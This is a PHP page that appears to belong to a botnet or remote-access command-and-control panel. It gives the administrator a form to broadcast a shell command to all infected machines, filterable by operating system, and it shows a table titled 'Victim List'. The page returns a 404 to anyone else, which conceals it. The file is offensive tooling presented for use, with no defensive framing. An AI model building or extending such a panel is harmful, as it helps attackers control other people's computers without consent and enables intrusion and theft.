<?php
require_once("conn.php");
require_once('header.php');
(int) $_SESSION['userId'] = isset($_SESSION['userId']) ? $_SESSION['userId'] : null;
if ($_SESSION['userId'] ==  1) {
?>

  <link rel="stylesheet" href="https://cdn.datatables.net/1.11.5/css/dataTables.bootstrap5.min.css">
  <link rel="stylesheet" href="style/style.css">

  <div class="row mx-0">
    <div class="col-4">
    </div>
    <div class="col-4 mb-1 text-center">
      <form action="actions" method="post" id=form_command>
        <input type="hidden" name="token" value="<?= $token ?>">
        <input type="text" name="command_to_all" placeholder="Command to everyone" required>
        <input type="submit" value="send" class="btn btn-danger" name="send_command_all"><br>
        <label><input type="checkbox" name="Windows" value="Windows"> Windows &nbsp</label>
        <label><input type="checkbox" name="Linux" value="Linux"> Linux &nbsp</label>
        <label><input type="checkbox" name="Mac" value="Macintosh"> Mac &nbsp</label>
        <label><input type="checkbox" name="Selected" value="Selected"> Selected &nbsp</label>
      </form>
    </div>
    <div class="col-4">
    </div>
  </div>
  <div id="wrapper" class="pt-4">
    <?php require_once('statistics.php'); ?>

    <div class="row mx-0">
      <div class="col-3 mb-3 text-center">
        <button onclick="refresh_div()" type="button" class="btn btn-default btn-sm bg-light border-light">
          <span class="glyphicon glyphicon-refresh"></span> refresh console
        </button>
      </div>
      <div class="col-6">
        <h1 class="mb-3 text-center">Victim List</h1>
      </div>
      <div class="col-3 mb-3 text-center">
      </div>
    </div>
    <div class="row mx-0">
      <div class="col-1"></div>
      <div class="col-10">
        <div class="result"> </div>
      </div>
      <div class="col-1"></div>
    </div>
  </div>
  </body>

  <script src="script/script.js"></script>
  <!-- scripts for datatable -->
  <script src="https://cdn.datatables.net/1.11.5/js/jquery.dataTables.min.js"></script>
  <!-- end of the scripts -->

  </html>
<?php } else {
  http_response_code(404);
} ?>